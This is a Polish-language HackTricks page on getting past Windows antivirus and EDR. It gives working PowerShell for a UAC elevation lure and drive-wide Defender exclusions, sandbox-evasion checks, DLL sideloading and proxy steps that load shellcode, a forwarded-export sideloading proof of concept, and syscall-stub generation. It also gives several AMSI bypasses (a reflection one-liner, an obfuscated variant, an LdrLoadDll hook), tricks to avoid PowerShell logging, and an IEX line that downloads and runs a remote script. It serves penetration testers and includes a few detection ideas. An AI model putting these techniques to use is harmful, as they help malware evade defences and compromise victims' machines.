# Obejście Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie zatrzymujące działanie Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie zatrzymujące działanie Windows Defender i podszywające się pod inny AV.
- [Wyłącz Defendera, jeśli jesteś administratorem](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed ingerencją w Defendera

Publiczne loadery podszywające się pod game cheats są często dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień**, a dopiero potem wyłączają Defendera. Przebieg jest prosty:

1. Sprawdź, czy kontekst ma uprawnienia administratora, używając `net session`. Polecenie kończy się powodzeniem tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc niepowodzenie wskazuje, że loader działa jako standardowy użytkownik.
2. Natychmiast uruchom ponownie samego siebie z użyciem czasownika `RunAs`, aby wywołać oczekiwany monit zgody UAC, zachowując oryginalny wiersz poleceń.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Ofiary już wierzą, że instalują „crackowane” oprogramowanie, więc monit jest zazwyczaj akceptowany, co daje malware uprawnienia potrzebne do zmiany zasad Defendera.<sup>[[26]](#references)</sup>

### Kompleksowe wykluczenia `MpPreference` dla każdej litery dysku

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoader maksymalizują ślepe punkty Defendera, zamiast całkowicie wyłączać usługę. Loader najpierw kończy działanie watchdoga GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, dzięki czemu każdy profil użytkownika, katalog systemowy i dysk wymienny staje się niemożliwy do przeskanowania:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itd.), więc **każdy przyszły payload zapisany w dowolnym miejscu na dysku zostanie pominięty**.
- Wykluczenie rozszerzenia `.sys` jest działaniem przyszłościowym — attackerzy zachowują możliwość późniejszego ładowania unsigned drivers bez ponownego modyfikowania Defendera.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu kolejne etapy mogą potwierdzić, że wykluczenia nadal obowiązują, lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, naiwne kontrole stanu nadal zgłaszają „antivirus active”, mimo że inspekcja w czasie rzeczywistym nigdy nie obejmuje tych ścieżek.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Obecnie AVs używają różnych metod sprawdzania, czy plik jest malicious, czy nie: static detection, dynamic analysis, a w przypadku bardziej zaawansowanych EDRs — behavioural analysis.

### **Static detection**

Static detection polega na oznaczaniu znanych malicious strings lub tablic bajtów w pliku binarnym albo skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, digital signatures, ikony, checksum itd.). Oznacza to, że używanie znanych public tools może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako malicious. Istnieje kilka sposobów na obejście tego rodzaju detection:

- **Encryption**

Jeśli zaszyfrujesz binary, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować pewnego rodzaju loadera, który odszyfruje i uruchomi program w pamięci.

- **Obfuscation**

Czasami wystarczy zmienić kilka strings w binary lub skrypcie, aby przejść przez AV, ale w zależności od tego, co próbujesz obfuscate, może to być czasochłonne.

- **Custom tooling**

Jeśli opracujesz własne tools, nie będą istniały żadne znane bad signatures, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem na sprawdzenie static detection w Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Narzędzie zasadniczo dzieli plik na wiele segmentów, a następnie zleca Defenderowi przeskanowanie każdego z nich osobno, dzięki czemu może dokładnie wskazać, które strings lub bytes w twoim binary zostały oznaczone.

Zdecydowanie polecam zapoznać się z tą [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) dotyczącą praktycznego AV Evasion.

### **Dynamic analysis**

Dynamic analysis polega na tym, że AV uruchamia binary w sandboxie i obserwuje malicious activity (np. próby odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump na LSASS itd.). Z tą częścią może być nieco trudniej, ale oto kilka rzeczy, które możesz zrobić, aby uniknąć sandboxów.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób na ominięcie dynamic analysis prowadzonej przez AV. AVs mają bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie sleep może zakłócać analizę binaries. Problem polega na tym, że wiele sandboxów AV może po prostu pominąć sleep, zależnie od sposobu jego implementacji.
- **Checking machine's resources** Sandboxes zazwyczaj mają do dyspozycji bardzo mało zasobów (np. < 2GB RAM), ponieważ w przeciwnym razie mogłyby spowalniać komputer użytkownika. Możesz być tutaj również bardzo kreatywny, na przykład sprawdzając temperaturę CPU albo nawet prędkość obrotową wentylatorów — nie wszystko będzie zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz obrać za cel użytkownika, którego workstation jest dołączona do domeny „contoso.local”, możesz sprawdzić domenę komputera, aby zobaczyć, czy odpowiada określonej przez ciebie domenie. Jeśli nie, możesz zakończyć działanie programu.

Okazuje się, że computername komputera w Microsoft Defender's Sandbox to HAL9TH, więc przed detonacją możesz sprawdzić nazwę komputera w swoim malware. Jeśli nazwa odpowiada HAL9TH, oznacza to, że znajdujesz się wewnątrz defender's sandbox, więc możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących działania przeciwko Sandboxom

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak już wcześniej wspomnieliśmy w tym poście, **public tools** w końcu **zostaną wykryte**, więc powinieneś zadać sobie pewne pytanie:

Na przykład, jeśli chcesz wykonać dump LSASS, **czy naprawdę musisz używać mimikatz**? A może mógłbyś użyć innego, mniej znanego projektu, który również wykonuje dump LSASS?

Prawdopodobnie właściwą odpowiedzią jest ta druga opcja. Biorąc mimikatz jako przykład, jest to prawdopodobnie jeden z najbardziej, jeśli nie najbardziej, oznaczanych jako malicious elementów malware przez AVs i EDRs. Sam projekt jest świetny, ale praca z nim w celu ominięcia AVs to koszmar, więc po prostu poszukaj alternatyw dla tego, co próbujesz osiągnąć.

> [!TIP]
> Podczas modyfikowania payloads w celu uzyskania evasion pamiętaj, aby **wyłączyć automatic sample submission** w defenderze, i proszę, naprawdę, **NIE UPLOADUJ DO VIRUSTOTAL**, jeśli twoim długoterminowym celem jest osiągnięcie evasion. Jeśli chcesz sprawdzić, czy twój payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatic sample submission i testuj go tam, aż będziesz zadowolony z rezultatu.

## EXEs vs DLLs

Jeśli tylko jest to możliwe, zawsze **priorytetowo traktuj używanie DLLs w celu uzyskania evasion**. Z mojego doświadczenia wynika, że pliki DLL są zazwyczaj **znacznie rzadziej wykrywane** i analizowane, więc w niektórych przypadkach jest to bardzo prosty trik pozwalający uniknąć detection (oczywiście jeśli twój payload może działać jako DLL).

Jak widać na tym obrazie, DLL Payload z Havoc ma detection rate 4/26 w antiscan.me, podczas gdy EXE payload ma detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Teraz pokażemy kilka trików, których możesz użyć z plikami DLL, aby uzyskać znacznie większą stealthiness.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez loader, umieszczając aplikację ofiary i malicious payload(s) obok siebie.

Możesz sprawdzać programy podatne na DLL Sideloading za pomocą [Siofra](https://github.com/Cybereason/siofra) oraz następującego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wyświetli listę programów podatnych na DLL hijacking znajdujących się w „C:\Program Files\\” oraz pliki DLL, które próbują załadować.

Zdecydowanie zalecam, aby samodzielnie **przetestować programy podatne na DLL Hijacking/Sideloading**. Technika ta, prawidłowo wykonana, jest dość stealthy, ale jeśli użyjesz publicznie znanych programów podatnych na DLL Sideloading, możesz zostać łatwo wykryty.

Samo umieszczenie złośliwej biblioteki DLL o nazwie oczekiwanej przez program nie spowoduje załadowania payloadu, ponieważ program oczekuje określonych funkcji wewnątrz tej biblioteki DLL. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania wykonywane przez program z biblioteki proxy (i złośliwej) DLL do oryginalnej biblioteki DLL, zachowując funkcjonalność programu i umożliwiając obsługę wykonania payloadu.

Użyję projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/).

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną DLL ze zmienioną nazwą.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)) oraz proxy DLL mają współczynnik wykrywania 0/26 w [antiscan.me](https://antiscan.me)! Można uznać to za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Zdecydowanie polecam** obejrzenie [VOD-a S3cur3Th1sSh1t na Twitchu](https://www.twitch.tv/videos/1644171543) na temat DLL Sideloading, a także [filmu ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o omawianych zagadnieniach.

### Wykorzystanie Forwarded Exports (ForwardSideLoading)

Moduły Windows PE mogą eksportować funkcje, które są w rzeczywistości „forwarders”: zamiast wskazywać kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy caller rozwiązuje eksport, Windows loader:

- Załaduje `TargetDll`, jeśli nie został jeszcze załadowany
- Rozwiąże z niego `TargetFunc`

Najważniejsze zachowania, które należy znać:
- Jeśli `TargetDll` jest KnownDLL, zostanie dostarczony z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, zostanie użyta normalna kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego forward resolution.

Umożliwia to zastosowanie pośredniego sideloading primitive: należy znaleźć podpisaną DLL eksportującą funkcję przekierowaną do modułu o nazwie innej niż KnownDLL, a następnie umieścić tę podpisaną DLL razem z kontrolowaną przez atakującego DLL o nazwie dokładnie takiej jak przekierowany moduł docelowy. Gdy forwarded export zostanie wywołany, loader rozwiąże forward i załaduje Twoją DLL z tego samego katalogu, wykonując jej DllMain.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwana zgodnie ze standardową kolejnością wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisaną systemową bibliotekę DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy plik `NCRYPTPROV.dll` w tym samym folderze. Minimalna funkcja DllMain wystarczy do wykonania kodu; nie musisz implementować przekazywanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wyzwól przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zaobserwowane zachowanie:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące huntingu:
- Skup się na forwarded exports, w przypadku których docelowy moduł nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczać forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły dotyczące wykrywania/ochrony:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL z innych ścieżek niż systemowe, a następnie ładujące z tego katalogu elementy niebędące KnownDLLs o tej samej nazwie bazowej
- Generuj alerty dla łańcuchów procesów/modułów takich jak: `rundll32.exe` → `keyiso.dll` spoza katalogu systemowego → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj zasady integralności kodu (WDAC/AppLocker) i blokuj zapis+wykonywanie w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to toolkit payloadów służący do omijania EDR za pomocą zawieszonych procesów, direct syscalls i alternatywnych metod wykonywania`

Możesz użyć Freeze do załadowania i wykonania shellcode w sposób zapewniający ukrycie.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to gra w kotka i myszkę — to, co działa dzisiaj, jutro może zostać wykryte, dlatego nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj łączyć wiele technik evasion.

## Direct/Indirect Syscalls i SSN Resolution (SysWhispers4)

EDR-y często umieszczają **user-mode inline hooks** w stubach syscall w `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować **direct** lub **indirect syscall stubs**, które ładują właściwy **SSN** (System Service Number) i przechodzą do trybu kernel bez wykonywania zahookowanego export entrypoint.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (embedded)**: umieszcza instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (bez odwołania do exportu `ntdll`).
- **Indirect**: wykonuje skok do istniejącego gadżetu `syscall` wewnątrz `ntdll`, dzięki czemu przejście do kernela wygląda, jakby pochodziło z `ntdll` (przydatne do evasion heurystycznego); **randomized indirect** wybiera gadżet z puli przy każdym wywołaniu.
- **Egg-hunt**: unika umieszczania statycznej sekwencji opcode `0F 05` na dysku; rozwiązuje sekwencję syscall w runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: wnioskuje SSN, sortując stuby syscall według adresu wirtualnego zamiast odczytywać bajty stubów.
- **SyscallsFromDisk**: mapuje czysty `\KnownDlls\ntdll.dll`, odczytuje SSN z jego `.text`, a następnie go odmapowuje (omija wszystkie hooki znajdujące się w pamięci).
- **RecycledGate**: łączy wnioskowanie SSN na podstawie sortowania VA z walidacją opcode, gdy stub jest czysty; jeśli jest zahookowany, przełącza się na wnioskowanie na podstawie VA.
- **HW Breakpoint**: ustawia DR0 na instrukcji `syscall` i używa VEH do przechwycenia SSN z `EAX` w runtime, bez parsowania zahookowanych bajtów.

Przykład użycia SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI został utworzony, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AV potrafiły skanować wyłącznie **pliki na dysku**, więc jeśli udało się jakoś wykonać payloady **bezpośrednio w pamięci**, AV nie mógł nic zrobić, aby temu zapobiec, ponieważ nie miał wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z następującymi komponentami systemu Windows.

- User Account Control, czyli UAC (podnoszenie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra Office VBA

Umożliwia rozwiązaniom antywirusowym inspekcję działania skryptów poprzez udostępnianie ich zawartości w formie, która jest zarówno niezaszyfrowana, jak i pozbawiona obfuskacji.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wywoła następujący alert w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że dodaje prefiks `amsi:`, a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt, w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, ale mimo to zostaliśmy wykryci w pamięci z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# również jest sprawdzany przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])`, używanego do ładowania wykonania w pamięci. Dlatego w przypadku wykonywania w pamięci zaleca się używanie niższych wersji .NET (takich jak 4.7.2 lub niższych), jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuskacja**

Ponieważ AMSI działa głównie na podstawie statycznych detekcji, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

AMSI potrafi jednak usunąć obfuskację ze skryptów, nawet jeśli mają one wiele warstw, więc obfuskacja może być złym rozwiązaniem, zależnie od sposobu jej zastosowania. Sprawia to, że ominięcie zabezpieczenia nie jest takie proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych i problem znika, więc zależy to od tego, w jakim stopniu dana rzecz została oflagowana.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane poprzez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), można łatwo manipulować jego działaniem nawet jako użytkownik bez uprzywilejowanych uprawnień. Z powodu tej wady implementacji AMSI badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Wymuszenie błędu**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że dla bieżącego procesu nie zostanie zainicjowane skanowanie. Pierwotnie zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę mającą zapobiegać szerszemu wykorzystaniu tej metody.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uniemożliwić AMSI działanie w bieżącym procesie powershell. Ta linia została oczywiście wykryta przez samo AMSI, dlatego konieczna jest jej modyfikacja, aby można było użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który zaczerpnąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

Istnieje również wiele innych technik używanych do bypass AMSI with powershell, sprawdź [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) oraz [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się o nich więcej.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidny, niezależny od języka bypass polega na umieszczeniu user-mode hooka na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i dla tego procesu nie są wykonywane żadne skany.<sup>[[23]](#references)</sup>

Zarys implementacji (pseudocode x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notatki
- Działa w PowerShell, WScript/CScript i niestandardowych loaderach (czyli we wszystkim, co w przeciwnym razie załadowałoby AMSI).
- Połącz z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
- Stosowane w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypt do bypassu AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypt do bypassu AMSI, który unika sygnatur dzięki losowym, zdefiniowanym przez użytkownika funkcjom, zmiennym i wyrażeniom znakowym oraz stosuje losową wielkość liter w słowach kluczowych PowerShell, aby uniknąć sygnatur.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** oraz **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie działa poprzez skanowanie pamięci bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisanie jej instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj wersji Powershell 2**
Jeśli używasz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz zrobić to w następujący sposób:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging to funkcja umożliwiająca rejestrowanie wszystkich poleceń PowerShell wykonywanych w systemie. Może być przydatna do celów audytu i rozwiązywania problemów, ale może również stanowić **problem dla attackerów, którzy chcą uniknąć wykrycia**.

Aby ominąć PowerShell logging, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: Możesz w tym celu użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Jeśli używasz PowerShell version 2, AMSI nie zostanie załadowane, dzięki czemu możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić za pomocą: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby uruchomić powershell bez zabezpieczeń (tego właśnie używa `powerpick` z Cobal Strike).


## Obfuscation

> [!TIP]
> Kilka technik obfuscation polega na szyfrowaniu danych, co zwiększy entropię pliku binarnego i ułatwi jego wykrycie przez AV i EDR. Zachowaj ostrożność i rozważ stosowanie szyfrowania wyłącznie do określonych sekcji kodu, które zawierają dane wrażliwe lub muszą zostać ukryte.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Podczas analizy malware używającego ConfuserEx 2 (lub komercyjnych forków) często można napotkać kilka warstw ochrony, które blokują dekompilatory i sandboxy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który można następnie zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usunięcie anti-tampering – ConfuserEx szyfruje każde *method body* i odszyfrowuje je wewnątrz statycznego konstruktora (`<Module>.cctor`) *module*. Modyfikuje również sumę kontrolną PE, więc każda zmiana spowoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i przepisać czyste assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Wynik zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne podczas tworzenia własnego unpackera.

2.  Odzyskanie symboli / control-flow – przekaż *clean* plik do **de4dot-cex** (fork de4dot obsługujący ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flagi:
• `-p crx` – wybiera profil ConfuserEx 2
• de4dot cofnie control-flow flattening, przywróci oryginalne namespaces, klasy i nazwy zmiennych oraz odszyfruje stałe stringi.

3.  Usunięcie proxy calls – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby dodatkowo utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne .NET API, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieprzejrzystych funkcji wrapperów (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* payload. Malware często przechowuje go jako tablicę bajtów zakodowaną w TLV, inicjalizowaną wewnątrz `<Module>.byte_0`.

